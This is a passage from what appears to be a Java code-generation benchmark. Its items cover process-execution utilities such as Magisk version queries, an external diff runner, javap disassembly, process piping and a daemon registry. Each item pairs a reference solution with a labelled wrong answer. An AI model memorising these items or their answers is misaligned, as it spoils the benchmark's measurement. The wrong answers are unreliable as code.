    "Instruction": "Task Description: The task involves creating utility functions for executing system commands and retrieving information about the Magisk tool using Java's ProcessBuilder for inter-process communication.\n\nFunction Description: The provided code consists of three utility functions that work with system processes to execute commands and retrieve Magisk-related information. These functions demonstrate proper process handling, stream management, and error handling in Java.\n\nMethods:\n\nMethod1: exec(String... command) -> void - Executes a system command using ProcessBuilder. Takes a variable number of strings representing the command and its arguments. Logs the exit code or any errors encountered during execution.\n\nMethod2: getMagiskVersionCode() -> int - Retrieves the version code of Magisk by executing 'magisk -V' command. Returns the version code as an integer, or -1 if an error occurs. Caches the result for subsequent calls.\n\nMethod3: getMagiskTmpfsPath() -> String - Retrieves the tmpfs path used by Magisk by executing 'magisk --path' command. Returns the path as a string, or an empty string if an error occurs. Checks Magisk version first and returns '/sbin' for older versions (<21000). Caches the result for subsequent calls.\n\nAttributes:\nmagiskVersionCode: int - Caches the Magisk version code to avoid repeated process execution\nmagiskTmpfsPath: String - Caches the Magisk tmpfs path to avoid repeated process execution",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.Executors;\n\npublic static void exec(String... command) {\n    ProcessBuilder pb = new ProcessBuilder(command);\n    try {\n        Process process = pb.start();\n        int code = process.waitFor();\n        Log.i(TAG, \"Exec \" + command[0] + \" exited with \" + code);\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec \" + command[0], e);\n    }\n}\n\npublic static int getMagiskVersionCode() {\n    if (magiskVersionCode != -1) {\n        return magiskVersionCode;\n    }\n\n    try {\n        ProcessBuilder ps = new ProcessBuilder(\"magisk\", \"-V\");\n        ps.redirectErrorStream(true);\n        Process pr = ps.start();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n        String line = in.readLine();\n        Log.i(TAG, \"Exec magisk -V: \" + line);\n        magiskVersionCode = Integer.parseInt(line);\n        pr.waitFor();\n        in.close();\n        return magiskVersionCode;\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec magisk -V\", e);\n        return -1;\n    }\n}\n\npublic static String getMagiskTmpfsPath() {\n    if (magiskTmpfsPath != null) {\n        return magiskTmpfsPath;\n    }\n\n    if (getMagiskVersionCode() < 21000) {\n        return \"/sbin\";\n    }\n\n    try {\n        ProcessBuilder ps = new ProcessBuilder(\"magisk\", \"--path\");\n        ps.redirectErrorStream(true);\n        Process pr = ps.start();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n        magiskTmpfsPath = in.readLine();\n        Log.i(TAG, \"Exec magisk --path: \" + magiskTmpfsPath);\n        pr.waitFor();\n        in.close();\n        return magiskTmpfsPath;\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec magisk --path\", e);\n        return \"\";\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "exec(String... command) {\n    try {\n        ProcessBuilder processBuilder = new ProcessBuilder(command);\n        processBuilder.redirectErrorStream(true);\n        Process process = processBuilder.start();\n        int exitCode = process.waitFor();\n        System.out.println(\"Command executed with exit code: \" + exitCode);\n    } catch (Exception e) {\n        System.err.println(\"Error executing command: \" + e.getMessage());\n    }\n}\n\nprivate int magiskVersionCode = -1;\n\nint getMagiskVersionCode() {\n    if (magiskVersionCode != -1) {\n        return magiskVersionCode;\n    }\n    try {\n        ProcessBuilder processBuilder = new ProcessBuilder(\"magisk\", \"-V\");\n        processBuilder.redirectErrorStream(true);\n        Process process = processBuilder.start();\n        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            try {\n                magiskVersionCode = Integer.parseInt(line.trim());\n                break;\n            } catch (NumberFormatException e) {\n                continue;\n            }\n        }\n        process.waitFor();\n    } catch (Exception e) {\n        System.err.println(\"Error getting Magisk version code: \" + e.getMessage());\n    }\n    return magiskVersionCode;\n}\n\nprivate String magiskTmpfsPath = \"\";\n\nString getMagiskTmpfsPath() {\n    if (!magiskTmpfsPath.isEmpty()) {\n        return magiskTmpfsPath;\n    }\n    int versionCode = getMagiskVersionCode();\n    if (versionCode < 21000) {\n        magiskTmpfsPath = \"/sbin\";\n        return magiskTmpfsPath;\n    }\n    try {\n        ProcessBuilder processBuilder = new ProcessBuilder(\"magisk\", \"--path\");\n        processBuilder.redirectErrorStream(true);\n        Process process = processBuilder.start();\n        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            magiskTmpfsPath = line.trim();\n            break;\n        }\n        process.waitFor();\n    } catch (Exception e) {\n        System.err.println(\"Error getting Magisk tmpfs path: \" + e.getMessage());\n    }\n    return magiskTmpfsPath;\n}"
  },
  {
    "Task_id": 296,
    "Instruction": "Task Description: Create a function that executes an external diff tool to compare two files and generate a difference file, while capturing and logging the tool's output.\n\nFunction Description: The function `diffFile` executes an external diff utility specified by its path and arguments, comparing two input files (old and new versions) and generating a difference file. It captures the standard output and error streams of the external process, logs them, and waits for the process to complete before returning.\n\nInput:\n- `mCustomDiffPath`: String - Path to the external diff tool executable\n- `mCustomDiffPathArgs`: String - Arguments to pass to the diff tool (space-separated)\n- `oldFile`: File - The original file to compare against\n- `newFile`: File - The modified file to compare\n- `diffFile`: File - The output file where differences will be written\n\nOutput:\n- None (void) - The function doesn't return any value but writes the diff output to the specified file and logs the process output\n- Throws IOException if process execution fails\n- Throws InterruptedException if the process is interrupted while waiting",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic static void diffFile(String mCustomDiffPath, String mCustomDiffPathArgs, File oldFile, File newFile, File diffFile) throws IOException {\n    String outPath = diffFile.getAbsolutePath();\n    String cmd = mCustomDiffPath;\n    List<String> cmds = new ArrayList<>();\n    for (String s : cmd.split(\" \")) {\n        if (!s.isEmpty()) {\n            cmds.add(s);\n        }\n    }\n    for (String s : mCustomDiffPathArgs.split(\" \")) {\n        if (!s.isEmpty()) {\n            cmds.add(s);\n        }\n    }\n    cmds.add(oldFile.getAbsolutePath());\n    cmds.add(newFile.getAbsolutePath());\n    cmds.add(outPath);\n\n    ProcessBuilder pb = new ProcessBuilder(cmds);\n    pb.redirectErrorStream(true);\n    Process process = pb.start();\n    BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n    String line;\n    while ((line = br.readLine()) != null) {\n        Logger.d(line);\n    }\n    int exitCode = process.waitFor();\n    process.destroy();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\npublic void diffFile(String mCustomDiffPath, String mCustomDiffPathArgs, File oldFile, File newFile, File diffFile) throws IOException, InterruptedException {\n    ProcessBuilder processBuilder = new ProcessBuilder(mCustomDiffPath, mCustomDiffPathArgs, oldFile.getAbsolutePath(), newFile.getAbsolutePath());\n    processBuilder.redirectErrorStream(true);\n    Process process = processBuilder.start();\n\n    try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n         BufferedWriter writer = new BufferedWriter(new FileWriter(diffFile))) {\n        String line;\n        while ((line = reader.readLine()) != null) {\n            writer.write(line);\n            writer.newLine();\n            System.out.println(line);\n        }\n    }\n\n    int exitCode = process.waitFor();\n    if (exitCode != 0) {\n        throw new IOException(\"Diff process exited with code: \" + exitCode);\n    }\n}\n```"
  },
  {
    "Task_id": 298,
    "Instruction": "Task Description: Create a Java function that disassembles a Java class file using the `javap` command-line tool and returns the disassembled output as a string.\n\nFunction Description: The function `disassembleClassFromJava` takes a Java class file as input, executes the `javap -c` command on it to disassemble the bytecode, and returns the disassembled output as a string. It handles the process execution, stream management, and error handling.\n\nInput: \n- `resourceFile` (String): The path or name of the Java class file to be disassembled.\n\nOutput: \n- (String): The disassembled bytecode output from the `javap` command. If an error occurs, returns an error message string.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.StringWriter;\nimport java.net.URL;\n\npublic String disassembleClassFromJava(String resourceFile) {\n    try {\n        ProcessBuilder pb = new ProcessBuilder(\"javap\", \"-c\", resourceFile)\n                .redirectErrorStream(true);\n\n        final Process process = pb.start();\n        final StringWriter writer = new StringWriter();\n        new Thread(() -> IOUtils.copyStreamNoException(process.getInputStream(), writer)).start();\n\n        final int ignored = process.waitFor();\n        final String processOutput = writer.toString();\n        return processOutput;\n    } catch (InterruptedException e) {\n        Thread.currentThread().interrupt();\n        return \"Unable to run javap command (\" + e.getMessage() + \").\";\n    } catch (IOException e) {\n        return \"Unable to run javap command (\" + e.getMessage() + \").\";\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public static String disassembleClassFromJava(String resourceFile) {\n    StringBuilder output = new StringBuilder();\n    try {\n        ProcessBuilder processBuilder = new ProcessBuilder(\"javap\", \"-c\", resourceFile);\n        processBuilder.redirectErrorStream(true);\n        Process process = processBuilder.start();\n        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            output.setLength(0);\n            output.append(\"Error: javap command failed with exit code \").append(exitCode);\n        }\n    } catch (Exception e) {\n        output.append(\"Error: \").append(e.getMessage());\n    }\n    return output.toString();\n}"
  },
  {
    "Task_id": 299,
    "Instruction": "Task Description: Create a Java class that facilitates the execution of external processes and manages their input/output streams, including support for piping data between multiple processes.\n\nClass Description: The ProcessRunner class provides functionality to execute external processes and handle their input/output streams efficiently. It supports both simple process execution and complex piping between multiple processes. The class uses ProcessBuilder for process creation and AsyncPipe threads for non-blocking stream handling.\n\nAttributes:\n- processRoot: File - The working directory for executed processes\n\nMethods:\n- execute(ProcessBuilder pb) -> void - Executes a single process with its output and error streams redirected to System.out and System.err respectively. Throws IOException and InterruptedException.\n- pipe(InputStream is, OutputStream os, ProcessBuilder... builders) -> void - Executes multiple processes in sequence, piping the output of one process to the input of the next. Uses temporary files for intermediate storage. Throws IOException and InterruptedException.\n- AsyncPipe(InputStream is, OutputStream os) - Constructor for AsyncPipe thread that handles stream copying and closes streams when done.\n- AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) - Constructor for AsyncPipe thread with option to control stream closing behavior.\n- run() -> void - (AsyncPipe method) The thread's main execution method that copies data between streams.",
    "Canonical_solution": "import com.google.common.base.Joiner;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class ProcessRunner {\n\n  File processRoot;\n\n  public ProcessRunner(File processRoot) {\n    this.processRoot = processRoot;\n  }\n\n  public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n    System.out.println(Joiner.on(\" \").join(pb.command()));\n    Process process = pb.redirectErrorStream(true).directory(processRoot).start();\n    new AsyncPipe(process.getErrorStream(), System.err).start();\n    new AsyncPipe(process.getInputStream(), System.out).start();\n    process.waitFor();\n  }\n\n  public void pipe(InputStream is, OutputStream os, ProcessBuilder... builders)\n      throws IOException, InterruptedException {\n    int i = 0;\n    File tempin;\n    File tempout = File.createTempFile(\"pipe\", \"txt\");\n    OutputStream tos;\n    for (ProcessBuilder builder : builders) {\n      if (i == 0) {\n      } else {\n        tempin = tempout;\n        is = new FileInputStream(tempin);\n      }\n      if (i == builders.length - 1) {\n        if (os == null) {\n          tos = System.out;\n        } else {\n          tos = os;\n        }\n      } else {\n        tempout = File.createTempFile(\"pipe\", \"txt\");\n        tos = new FileOutputStream(tempout);\n      }\n      Process process = builder.redirectErrorStream(true).directory(processRoot).start();\n      new AsyncPipe(process.getErrorStream(), System.err, false).start();\n      new AsyncPipe(process.getInputStream(), tos).start();\n      if (is != null) {\n        new AsyncPipe(is, process.getOutputStream()).start();\n      }\n      i++;\n      process.waitFor();\n    }\n  }\n\n  class AsyncPipe extends Thread {\n\n    InputStream is;\n    OutputStream os;\n    boolean closeStreams;\n\n    AsyncPipe(InputStream is, OutputStream os) {\n      this.is = is;\n      this.os = os;\n      closeStreams = true;\n    }\n\n    AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n      this.is = is;\n      this.os = os;\n      this.closeStreams = closeStreams;\n    }\n\n    @Override\n    public void run() {\n      try {\n        synchronized (this) {\n          byte[] buf = new byte[4096];\n          int i;\n          while ((i = is.read(buf)) != -1) {\n            os.write(buf, 0, i);\n          }\n          if (closeStreams) {\n            os.close();\n            is.close();\n          }\n        }\n      } catch (IOException e) {\n        e.printStackTrace();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.*;\nimport java.util.*;\n\nclass ProcessRunner {\n    private File processRoot;\n\n    public ProcessRunner(File processRoot) {\n        this.processRoot = processRoot;\n    }\n\n    public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n        pb.directory(processRoot);\n        Process process = pb.start();\n        new AsyncPipe(process.getInputStream(), System.out).start();\n        new AsyncPipe(process.getErrorStream(), System.err).start();\n        process.waitFor();\n    }\n\n    public void pipe(InputStream is, OutputStream os, ProcessBuilder... builders) throws IOException, InterruptedException {\n        List<Process> processes = new ArrayList<>();\n        List<OutputStream> outputs = new ArrayList<>();\n        List<InputStream> inputs = new ArrayList<>();\n\n        for (int i = 0; i < builders.length; i++) {\n            ProcessBuilder pb = builders[i];\n            pb.directory(processRoot);\n            Process process = pb.start();\n            processes.add(process);\n\n            if (i > 0) {\n                inputs.add(processes.get(i - 1).getOutputStream());\n            } else {\n                inputs.add(is);\n            }\n\n            if (i < builders.length - 1) {\n                outputs.add(process.getInputStream());\n            } else {\n                outputs.add(os);\n            }\n        }\n\n        for (int i = 0; i < processes.size(); i++) {\n            new AsyncPipe(inputs.get(i), outputs.get(i)).start();\n        }\n\n        for (Process process : processes) {\n            process.waitFor();\n        }\n    }\n\n    private class AsyncPipe extends Thread {\n        private InputStream is;\n        private OutputStream os;\n        private boolean closeStreams;\n\n        public AsyncPipe(InputStream is, OutputStream os) {\n            this.is = is;\n            this.os = os;\n            this.closeStreams = true;\n        }\n\n        public AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n            this.is = is;\n            this.os = os;\n            this.closeStreams = closeStreams;\n        }\n\n        @Override\n        public void run() {\n            try {\n                byte[] buffer = new byte[8192];\n                int bytesRead;\n                while ((bytesRead = is.read(buffer)) != -1) {\n                    os.write(buffer, 0, bytesRead);\n                }\n                os.flush();\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                if (closeStreams) {\n                    try {\n                        is.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                    try {\n                        os.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 30,
    "Instruction": "Task Description: Implement a thread-safe registry class for managing daemon processes using memory-mapped files for persistent storage. The class should handle concurrent access, automatic file resizing, and data recovery from corrupted states.\n\nClass Description: DaemonRegistry is a thread-safe class that maintains a registry of daemon processes in a memory-mapped file. It provides methods to read, update, and manage daemon information with proper file locking and automatic buffer resizing when needed. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- LOGGER: Logger - Logger instance for logging operations\n- MAX_LENGTH: int - Maximum initial size for the memory-mapped buffer (32KB)\n- LOCK_TIMEOUT_MS: long - Timeout duration for acquiring file locks (20 seconds)\n- locks: Map<Path, Object> - Static concurrent map for maintaining file-level locks\n- registryFile: Path - Path to the registry file\n- lck: Object - Instance-specific lock object\n- channel: FileChannel - File channel for the registry file\n- buffer: MappedByteBuffer - Memory-mapped byte buffer for the file\n- size: long - Current size of the memory-mapped buffer\n- infosMap: Map<String, DaemonInfo> - Map storing daemon information\n\nMethods:\n- DaemonRegistry(Path registryFile) -> void - Constructor that initializes the registry by creating or opening the specified file and setting up the memory-mapped buffer\n- close() -> void - Closes the file channel and releases system resources\n- getAll() -> List<DaemonInfo> - Returns a list of all registered daemon information\n- read() -> void - Reads all daemon information from the memory-mapped file into the internal map\n- doUpdate(Runnable updater) -> void - Performs a read or update operation with file locking, handles buffer resizing and data recovery\n- tryLock() -> FileLock - Attempts to acquire an exclusive lock on the file\n- reset() -> void - Clears the internal map and resets the buffer\n- readString() -> String - Reads a UTF-8 encoded string from the buffer\n- writeString(String str) -> void - Writes a UTF-8 encoded string to the buffer\n- nextPowerOf2(long a, long min) -> long - Helper method to calculate the next power of 2 greater than or equal to input values",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.BufferOverflowException;\nimport java.nio.BufferUnderflowException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class DaemonRegistry implements AutoCloseable {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(DaemonRegistry.class);\n    private static final int MAX_LENGTH = 32768;\n    private static final long LOCK_TIMEOUT_MS = 1000 * 20;\n    private static final Map<Path, Object> locks = new ConcurrentHashMap<>();\n\n    private final Path registryFile;\n    private final Object lck;\n    private final FileChannel channel;\n    private MappedByteBuffer buffer;\n    private long size;\n    private final Map<String, DaemonInfo> infosMap = new HashMap<>();\n\n    public DaemonRegistry(Path registryFile) {\n        final Path absPath = registryFile.toAbsolutePath().normalize();\n        this.lck = locks.computeIfAbsent(absPath, p -> new Object());\n        this.registryFile = absPath;\n        try {\n            if (!Files.isRegularFile(absPath)) {\n                if (!Files.isDirectory(absPath.getParent())) {\n                    Files.createDirectories(absPath.getParent());\n                }\n            }\n            channel = FileChannel.open(\n                    absPath, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            size = nextPowerOf2(channel.size(), MAX_LENGTH);\n            buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n        } catch (IOException e) {\n            throw new DaemonException(e);\n        }\n    }\n\n    public void close() {\n        try {\n            channel.close();\n        } catch (IOException e) {\n            throw new DaemonException(\"Error closing registry\", e);\n        }\n    }\n\n    public List<DaemonInfo> getAll() {\n        read();\n        return new ArrayList<>(infosMap.values());\n    }\n\n    private void read() {\n        doUpdate(null);\n    }\n\n    private void doUpdate(Runnable updater) {\n        if (!Files.isReadable(registryFile)) {\n            throw new DaemonException(\"Registry became unaccessible\");\n        }\n\n        synchronized (lck) {\n            final long deadline = System.currentTimeMillis() + LOCK_TIMEOUT_MS;\n            while (System.currentTimeMillis() < deadline) {\n                try (FileLock l = tryLock()) {\n                    BufferCaster.cast(buffer).position(0);\n                    infosMap.clear();\n                    int nb = buffer.getInt();\n                    for (int i = 0; i < nb; i++) {\n                        String daemonId = readString();\n                        String javaHome = readString();\n                        String mavenHome = readString();\n                        int pid = buffer.getInt();\n                        String address = readString();\n\n                        byte[] token = new byte[DaemonInfo.TOKEN_SIZE];\n                        buffer.get(token);\n\n                        String locale = readString();\n                        List<String> opts = new ArrayList<>();\n                        int nbOpts = buffer.getInt();\n                        for (int j = 0; j < nbOpts; j++) {\n                            opts.add(readString());\n                        }\n                        DaemonState state = DaemonState.values()[buffer.get()];\n                        long lastIdle = buffer.getLong();\n                        long lastBusy = buffer.getLong();\n                        DaemonInfo di = new DaemonInfo(\n                                daemonId, javaHome, mavenHome, pid, address, token, locale, opts, state, lastIdle,\n                                lastBusy);\n                        infosMap.putIfAbsent(di.getId(), di);\n                    }\n\n                    if (updater != null) {\n                        updater.run();\n                        BufferCaster.cast(buffer).position((int) 0);\n                        buffer.putInt(infosMap.size());\n                        for (DaemonInfo di : infosMap.values()) {\n                            writeString(di.getId());\n                            writeString(di.getJavaHome());\n                            writeString(di.getMvndHome());\n                            buffer.putInt(di.getPid());\n                            writeString(di.getAddress());\n                            buffer.put(di.getToken());\n                            writeString(di.getLocale());\n                            buffer.putInt(di.getOptions().size());\n                            for (String opt : di.getOptions()) {\n                                writeString(opt);\n                            }\n                            buffer.put((byte) di.getState().ordinal());\n                            buffer.putLong(di.getLastIdle());\n                            buffer.putLong(di.getLastBusy());\n                        }\n                    }\n                    return;\n                } catch (BufferOverflowException e) {\n                    size <<= 1;\n                    LOGGER.info(\"Resizing registry to {} kb due to buffer overflow\", (size / 1024));\n                    try {\n                        buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n                    } catch (IOException ex) {\n                        ex.addSuppressed(e);\n                        throw new DaemonException(\"Could not resize registry \" + registryFile, ex);\n                    }\n                } catch (IOException e) {\n                    throw new DaemonException(\n                            \"Exception while \" + (updater != null ? \"updating \" : \"reading \") + registryFile, e);\n                } catch (IllegalStateException | ArrayIndexOutOfBoundsException | BufferUnderflowException e) {\n                    String absPath = registryFile.toAbsolutePath().normalize().toString();\n                    LOGGER.warn(\n                            \"Invalid daemon registry info, trying to recover from this issue. \"\n                                    + \"If you keep getting this warning, try deleting the `registry.bin` file at [{}]\",\n                            absPath,\n                            e);\n                    this.reset();\n                    return;\n                }\n            }\n            throw new RuntimeException(\"Could not lock \" + registryFile + \" within \" + LOCK_TIMEOUT_MS + \" ms\");\n        }\n    }\n\n    private FileLock tryLock() {\n        try {\n            return channel.tryLock(0, size, false);\n        } catch (IOException e) {\n            throw new DaemonException(\"Could not lock \" + registryFile, e);\n        }\n    }\n\n    private void reset() {\n        infosMap.clear();\n        BufferCaster.cast(buffer).clear();\n        buffer.putInt(0);\n    }\n\n    protected String readString() {\n        int sz = buffer.getShort();\n        if (sz == -1) {\n            return null;\n        }\n        if (sz < -1 || sz > 1024) {\n            throw new IllegalStateException(\"Bad string size: \" + sz);\n        }\n        byte[] buf = new byte[sz];\n        buffer.get(buf);\n        return new String(buf, StandardCharsets.UTF_8);\n    }\n\n    protected void writeString(String str) {\n        if (str == null) {\n            buffer.putShort((short) -1);\n            return;\n        }\n        byte[] buf = str.getBytes(StandardCharsets.UTF_8);\n        if (buf.length > 1024) {\n            LOGGER.warn(\"Attempting to write string longer than 1024 bytes: '{}'. Please raise an issue.\", str);\n            str = str.substring(0, 1033);\n            while (buf.length > 1024) {\n                str = str.substring(0, str.length() - 12) + \"\u2026\";\n                buf = str.getBytes(StandardCharsets.UTF_8);\n            }\n        }\n        buffer.putShort((short) buf.length);\n        buffer.put(buf);\n    }\n\n    private long nextPowerOf2(long a, long min) {\n        long b = min;\n        while (b < a) {\n            b = b << 1;\n        }\n        return b;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.*;\nimport java.nio.*;\nimport java.nio.channels.*;\nimport java.nio.file.*;\nimport java.util.*;\nimport java.util.concurrent.*;\nimport java.util.logging.Logger;\n\npublic class DaemonRegistry implements AutoCloseable {\n    private static final Logger LOGGER = Logger.getLogger(DaemonRegistry.class.getName());\n    private static final int MAX_LENGTH = 32 * 1024; // 32KB\n    private static final long LOCK_TIMEOUT_MS = 20000;\n    private static final Map<Path, Object> locks = new ConcurrentHashMap<>();\n\n    private final Path registryFile;\n    private final Object lck = new Object();\n    private FileChannel channel;\n    private MappedByteBuffer buffer;\n    private long size;\n    private final Map<String, DaemonInfo> infosMap = new ConcurrentHashMap<>();\n\n    public DaemonRegistry(Path registryFile) throws IOException {\n        this.registryFile = registryFile;\n        initialize();\n    }\n\n    private void initialize() throws IOException {\n        if (!Files.exists(registryFile)) {\n            Files.createFile(registryFile);\n        }\n\n        synchronized (locks.getOrDefault(registryFile, new Object())) {\n            channel = FileChannel.open(registryFile, StandardOpenOption.READ, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n            buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, MAX_LENGTH);\n            size = MAX_LENGTH;\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    public List<DaemonInfo> getAll() {\n        doUpdate(() -> {\n            read();\n        });\n        return new ArrayList<>(infosMap.values());\n    }\n\n    private void read() {\n        try {\n            buffer.rewind();\n            while (buffer.hasRemaining()) {\n                String name = readString();\n                if (name == null || name.isEmpty()) {\n                    break;\n                }\n                int pid = buffer.getInt();\n                long startTime = buffer.getLong();\n                boolean running = buffer.get() == 1;\n                infosMap.put(name, new DaemonInfo(name, pid, startTime, running));\n            }\n        } catch (Exception e) {\n            LOGGER.severe(\"Error reading daemon info: \" + e.getMessage());\n            reset();\n        }\n    }\n\n    private void doUpdate(Runnable updater) {\n        FileLock lock = tryLock();\n        if (lock == null) {\n            throw new RuntimeException(\"Failed to acquire lock on registry file\");\n        }\n\n        try {\n            synchronized (lck) {\n                updater.run();\n            }\n        } finally {\n            try {\n                lock.release();\n            } catch (IOException e) {\n                LOGGER.warning(\"Error releasing lock: \" + e.getMessage());\n            }\n        }\n    }\n\n    private FileLock tryLock() {\n        try {\n            Object lockObj = locks.computeIfAbsent(registryFile, k -> new Object());\n            synchronized (lockObj) {\n                FileLock lock = channel.tryLock(0, Long.MAX_VALUE, false);\n                if (lock != null) {\n                    return lock;\n                }\n            }\n        } catch (OverlappingFileLockException | ClosedChannelException | IOException e) {\n            LOGGER.warning(\"Failed to acquire lock: \" + e.getMessage());\n        }\n        return null;\n    }\n\n    private void reset() {\n        infosMap.clear();\n        buffer.clear();\n    }\n\n    private String readString() {\n        int length = buffer.getInt();\n        if (length <= 0 || length > buffer.remaining()) {\n            return null;\n        }\n        byte[] bytes = new byte[length];\n        buffer.get(bytes);\n        return new String(bytes, StandardCharsets.UTF_8);\n    }\n\n    private void writeString(String str) {\n        byte[] bytes = str.getBytes(StandardCharsets.UTF_8);\n        buffer.putInt(bytes.length);\n        buffer.put(bytes);\n    }\n\n    private long nextPowerOf2(long a, long min) {\n        if (a < min) {\n            a = min;\n        }\n        a--;\n        a |= a >> 1;\n        a |= a >> 2;\n        a |= a >> 4;\n        a |= a >> 8;\n        a |= a >> 16;\n        a |= a >> 32;\n        a++;\n        return a;\n    }\n\n    public static class DaemonInfo {\n        private final String name;\n        private final int pid;\n        private final long startTime;\n        private final boolean running;\n\n        public DaemonInfo(String name, int pid, long startTime, boolean running) {\n            this.name = name;\n            this.pid = pid;\n            this.startTime = startTime;\n            this.running = running;\n        }\n\n        public String getName() {\n            return name;\n        }\n\n        public int getPid() {\n            return pid;\n        }\n\n        public long getStartTime() {\n            return startTime;\n        }\n\n        public boolean isRunning() {\n            return running;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 300,
    "Instruction": "Task Description: Implement a function that executes an external process, captures its output and error streams, and handles the results appropriately, including error cases and output printing.\n\nFunction Description: The function `doFork` executes an external process specified by a command string, redirects its standard output and error streams to files, and optionally prints them. It waits for the process to complete, checks the exit code, and handles any exceptions or errors that occur during execution. The function also interacts with a `BinaryLinkServer` to retrieve results or exceptions from the forked process.\n\nInput:\n- `reader`: BinaryLinkServer - An object that reads results from the forked process and may contain exceptions.\n- `commandString`: List<String> - The command and arguments to execute the external process.\n- `stdOut`: File - The file to which the standard output of the process will be redirected.\n- `stdErr`: File - The file to which the standard error of the process will be redirected.\n- `printOut`: boolean - If true, the standard output will be printed to the console.\n- `printErr`: boolean - If true, the standard error will be printed to the console.\n\nOutput:\n- Returns `List<IterationResult>` - A list of results from the forked process if execution is successful.\n- Throws `BenchmarkException` - If the process fails (non-zero exit code), an IOException occurs, or the thread is interrupted.",
    "Canonical_solution": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.List;\n\nprivate List<IterationResult> doFork(BinaryLinkServer reader, List<String> commandString,\n                                    File stdOut, File stdErr, boolean printOut, boolean printErr) {\n    try (FileOutputStream fosErr = new FileOutputStream(stdErr);\n         FileOutputStream fosOut = new FileOutputStream(stdOut)) {\n        ProcessBuilder pb = new ProcessBuilder(commandString);\n        Process p = pb.start();\n\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), fosErr);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), fosOut);\n\n        if (printErr) {\n            errDrainer.addOutputStream(new OutputFormatAdapter(out));\n        }\n\n        if (printOut) {\n            outDrainer.addOutputStream(new OutputFormatAdapter(out));\n        }\n\n        errDrainer.start();\n        outDrainer.start();\n\n        int ecode = p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n\n        reader.waitFinish();\n\n        if (ecode != 0) {\n            out.println(\"<forked VM failed with exit code \" + ecode + \">\");\n            out.println(\"<stdout last='\" + TAIL_LINES_ON_ERROR + \" lines'>\");\n            for (String l : FileUtils.tail(stdOut, TAIL_LINES_ON_ERROR)) {\n                out.println(l);\n            }\n            out.println(\"</stdout>\");\n            out.println(\"<stderr last='\" + TAIL_LINES_ON_ERROR + \" lines'>\");\n            for (String l : FileUtils.tail(stdErr, TAIL_LINES_ON_ERROR)) {\n                out.println(l);\n            }\n            out.println(\"</stderr>\");\n\n            out.println(\"\");\n        }\n\n        BenchmarkException exception = reader.getException();\n        if (exception == null) {\n            if (ecode == 0) {\n                return reader.getResults();\n            } else {\n                throw new BenchmarkException(new IllegalStateException(\"Forked VM failed with exit code \" + ecode));\n            }\n        } else {\n            throw exception;\n        }\n\n    } catch (IOException ex) {\n        out.println(\"<failed to invoke the VM, caught IOException: 